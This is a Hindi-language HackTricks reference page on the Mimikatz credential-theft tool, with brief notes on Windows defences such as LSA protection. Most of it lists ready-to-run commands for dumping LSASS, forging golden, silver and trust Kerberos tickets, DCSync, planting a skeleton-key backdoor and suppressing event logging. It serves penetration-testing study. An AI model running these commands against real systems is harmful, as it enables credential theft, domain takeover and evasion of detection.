# Mimikatz

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>

**मोबाइल सुरक्षा** में अपनी विशेषज्ञता को 8kSec अकादमी के साथ गहरा करें। हमारे आत्म-गति पाठ्यक्रमों के माध्यम से iOS और Android सुरक्षा में महारत हासिल करें और प्रमाणित हों:

{% embed url="https://academy.8ksec.io/" %}

**यह पृष्ठ [adsecurity.org](https://adsecurity.org/?page_id=1821) से आधारित है**। आगे की जानकारी के लिए मूल पृष्ठ देखें!

## LM और स्पष्ट-टेक्स्ट मेमोरी में

Windows 8.1 और Windows Server 2012 R2 से आगे, क्रेडेंशियल चोरी के खिलाफ सुरक्षा के लिए महत्वपूर्ण उपाय लागू किए गए हैं:

- **LM हैश और स्पष्ट-टेक्स्ट पासवर्ड** अब मेमोरी में संग्रहीत नहीं किए जाते हैं ताकि सुरक्षा बढ़ सके। एक विशिष्ट रजिस्ट्री सेटिंग, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ को `0` के DWORD मान के साथ कॉन्फ़िगर किया जाना चाहिए ताकि डाइजेस्ट प्रमाणीकरण को निष्क्रिय किया जा सके, यह सुनिश्चित करते हुए कि "स्पष्ट-टेक्स्ट" पासवर्ड LSASS में कैश नहीं किए जाते हैं।

- **LSA सुरक्षा** को स्थानीय सुरक्षा प्राधिकरण (LSA) प्रक्रिया को अनधिकृत मेमोरी पढ़ने और कोड इंजेक्शन से बचाने के लिए पेश किया गया है। यह LSASS को एक संरक्षित प्रक्रिया के रूप में चिह्नित करके प्राप्त किया जाता है। LSA सुरक्षा को सक्रिय करने में शामिल हैं:
1. _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ पर रजिस्ट्री को संशोधित करना और `RunAsPPL` को `dword:00000001` पर सेट करना।
2. एक समूह नीति वस्तु (GPO) को लागू करना जो प्रबंधित उपकरणों में इस रजिस्ट्री परिवर्तन को लागू करता है।

इन सुरक्षा उपायों के बावजूद, Mimikatz जैसे उपकरण विशिष्ट ड्राइवरों का उपयोग करके LSA सुरक्षा को बायपास कर सकते हैं, हालांकि ऐसे कार्यों को घटना लॉग में रिकॉर्ड किया जाने की संभावना है।

### SeDebugPrivilege हटाने का प्रतिकार

प्रशासकों के पास आमतौर पर SeDebugPrivilege होता है, जो उन्हें कार्यक्रमों को डिबग करने की अनुमति देता है। इस विशेषाधिकार को अनधिकृत मेमोरी डंप को रोकने के लिए प्रतिबंधित किया जा सकता है, जो हमलावरों द्वारा मेमोरी से क्रेडेंशियल निकालने के लिए एक सामान्य तकनीक है। हालाँकि, इस विशेषाधिकार को हटाने के बावजूद, TrustedInstaller खाता अभी भी एक अनुकूलित सेवा कॉन्फ़िगरेशन का उपयोग करके मेमोरी डंप कर सकता है:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
यह `lsass.exe` मेमोरी को एक फ़ाइल में डंप करने की अनुमति देता है, जिसे फिर किसी अन्य सिस्टम पर क्रेडेंशियल्स निकालने के लिए विश्लेषण किया जा सकता है:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz विकल्प

Mimikatz में इवेंट लॉग छेड़छाड़ में दो मुख्य क्रियाएँ शामिल हैं: इवेंट लॉग को साफ करना और नए इवेंट्स के लॉगिंग को रोकने के लिए इवेंट सेवा को पैच करना। नीचे इन क्रियाओं को करने के लिए कमांड दिए गए हैं:

#### इवेंट लॉग को साफ करना

- **कमांड**: यह क्रिया इवेंट लॉग को हटाने के लिए है, जिससे दुर्भावनापूर्ण गतिविधियों का पता लगाना कठिन हो जाता है।
- Mimikatz अपने मानक दस्तावेज़ में इवेंट लॉग को सीधे अपने कमांड लाइन के माध्यम से साफ करने के लिए कोई सीधा कमांड प्रदान नहीं करता है। हालाँकि, इवेंट लॉग हेरफेर आमतौर पर Mimikatz के बाहर सिस्टम टूल या स्क्रिप्ट का उपयोग करके विशिष्ट लॉग को साफ करने में शामिल होता है (जैसे, PowerShell या Windows Event Viewer का उपयोग करना)।

#### प्रयोगात्मक विशेषता: इवेंट सेवा को पैच करना

- **कमांड**: `event::drop`
- यह प्रयोगात्मक कमांड इवेंट लॉगिंग सेवा के व्यवहार को संशोधित करने के लिए डिज़ाइन किया गया है, प्रभावी रूप से इसे नए इवेंट्स को रिकॉर्ड करने से रोकता है।
- उदाहरण: `mimikatz "privilege::debug" "event::drop" exit`

- `privilege::debug` कमांड सुनिश्चित करता है कि Mimikatz आवश्यक विशेषाधिकारों के साथ सिस्टम सेवाओं को संशोधित करता है।
- फिर `event::drop` कमांड इवेंट लॉगिंग सेवा को पैच करता है।

### Kerberos टिकट हमले

### गोल्डन टिकट निर्माण

गोल्डन टिकट डोमेन-व्यापी पहुंच अनुकरण की अनुमति देता है। मुख्य कमांड और पैरामीटर:

- कमांड: `kerberos::golden`
- पैरामीटर:
- `/domain`: डोमेन का नाम।
- `/sid`: डोमेन का सुरक्षा पहचानकर्ता (SID)।
- `/user`: अनुकरण करने के लिए उपयोगकर्ता नाम।
- `/krbtgt`: डोमेन के KDC सेवा खाते का NTLM हैश।
- `/ptt`: सीधे मेमोरी में टिकट को इंजेक्ट करता है।
- `/ticket`: बाद में उपयोग के लिए टिकट को सहेजता है।

उदाहरण:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Creation

Silver Tickets विशिष्ट सेवाओं तक पहुँच प्रदान करते हैं। मुख्य कमांड और पैरामीटर:

- Command: Golden Ticket के समान लेकिन विशिष्ट सेवाओं को लक्षित करता है।
- Parameters:
- `/service`: लक्षित सेवा (जैसे, cifs, http)।
- अन्य पैरामीटर Golden Ticket के समान। 

Example:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Trust Ticket Creation

Trust Tickets का उपयोग डोमेन के बीच संसाधनों तक पहुँचने के लिए विश्वास संबंधों का लाभ उठाने के लिए किया जाता है। मुख्य कमांड और पैरामीटर:

- Command: Golden Ticket के समान लेकिन विश्वास संबंधों के लिए।
- Parameters:
- `/target`: लक्षित डोमेन का FQDN।
- `/rc4`: ट्रस्ट खाते के लिए NTLM हैश।

Example:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### अतिरिक्त केर्बेरोस कमांड

- **टिकटों की सूची**:

- कमांड: `kerberos::list`
- वर्तमान उपयोगकर्ता सत्र के लिए सभी केर्बेरोस टिकटों की सूची बनाता है।

- **कैश पास करें**:

- कमांड: `kerberos::ptc`
- कैश फ़ाइलों से केर्बेरोस टिकटों को इंजेक्ट करता है।
- उदाहरण: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **टिकट पास करें**:

- कमांड: `kerberos::ptt`
- किसी अन्य सत्र में केर्बेरोस टिकट का उपयोग करने की अनुमति देता है।
- उदाहरण: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **टिकट हटाएं**:
- कमांड: `kerberos::purge`
- सत्र से सभी केर्बेरोस टिकटों को साफ करता है।
- संघर्ष से बचने के लिए टिकट हेरफेर कमांड का उपयोग करने से पहले उपयोगी।

### सक्रिय निर्देशिका छेड़छाड़

- **DCShadow**: AD ऑब्जेक्ट हेरफेर के लिए एक मशीन को अस्थायी रूप से DC के रूप में कार्य करने के लिए बनाएं।

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: पासवर्ड डेटा का अनुरोध करने के लिए एक DC की नकल करें।
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### क्रेडेंशियल एक्सेस

- **LSADUMP::LSA**: LSA से क्रेडेंशियल निकालें।

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: एक कंप्यूटर खाते के पासवर्ड डेटा का उपयोग करके DC का अनुकरण करें।

- _NetSync के लिए मूल संदर्भ में कोई विशिष्ट कमांड प्रदान नहीं की गई है।_

- **LSADUMP::SAM**: स्थानीय SAM डेटाबेस तक पहुंचें।

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: रजिस्ट्री में संग्रहीत रहस्यों को डिक्रिप्ट करें।

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: एक उपयोगकर्ता के लिए एक नया NTLM हैश सेट करें।

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: ट्रस्ट प्रमाणीकरण जानकारी प्राप्त करें।
- `mimikatz "lsadump::trust" exit`

### विविध

- **MISC::Skeleton**: DC पर LSASS में एक बैकडोर इंजेक्ट करें।
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### विशेषाधिकार वृद्धि

- **PRIVILEGE::Backup**: बैकअप अधिकार प्राप्त करें।

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: डिबग विशेषाधिकार प्राप्त करें।
- `mimikatz "privilege::debug" exit`

### क्रेडेंशियल डंपिंग

- **SEKURLSA::LogonPasswords**: लॉग इन उपयोगकर्ताओं के लिए क्रेडेंशियल दिखाएं।

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: मेमोरी से केर्बेरोस टिकट निकालें।
- `mimikatz "sekurlsa::tickets /export" exit`

### सिड और टोकन हेरफेर

- **SID::add/modify**: SID और SIDHistory बदलें।

- जोड़ें: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- संशोधित करें: _मूल संदर्भ में संशोधन के लिए कोई विशिष्ट कमांड नहीं है।_

- **TOKEN::Elevate**: टोकनों का अनुकरण करें।
- `mimikatz "token::elevate /domainadmin" exit`

### टर्मिनल सेवाएँ

- **TS::MultiRDP**: कई RDP सत्रों की अनुमति दें।

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: TS/RDP सत्रों की सूची बनाएं।
- _मूल संदर्भ में TS::Sessions के लिए कोई विशिष्ट कमांड प्रदान नहीं की गई है।_

### वॉल्ट

- Windows वॉल्ट से पासवर्ड निकालें।
- `mimikatz "vault::cred /patch" exit`

<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>

**मोबाइल सुरक्षा** में अपनी विशेषज्ञता बढ़ाएं 8kSec अकादमी के साथ। हमारे आत्म-गति पाठ्यक्रमों के माध्यम से iOS और Android सुरक्षा में महारत हासिल करें और प्रमाणित हों:

{% embed url="https://academy.8ksec.io/" %}

{{#include ../../banners/hacktricks-training.md}}
